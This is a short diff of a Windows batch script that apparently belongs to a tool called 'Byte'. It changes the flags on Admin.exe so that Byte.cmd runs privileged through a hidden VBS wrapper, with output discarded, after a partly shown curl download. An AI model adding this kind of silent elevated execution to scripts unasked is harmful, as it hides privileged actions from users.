@@ -32,7 +32,7 @@ curl.exe -sfL --compressed --retry 5 --retry-delay 5 --connect-timeout 5 -m 30 -
 
 :NotConnected
 :: Run Commands
-C:\Byte\Admin.exe -cli wscript.exe "C:\Byte\ByteHidden.vbs" "C:\Byte\Byte.cmd" >Nul 2>&1
+C:\Byte\Admin.exe --NoLogo --Privileged wscript.exe "C:\Byte\ByteHidden.vbs" "C:\Byte\Byte.cmd" >Nul 2>&1
 goto End
 
 :End
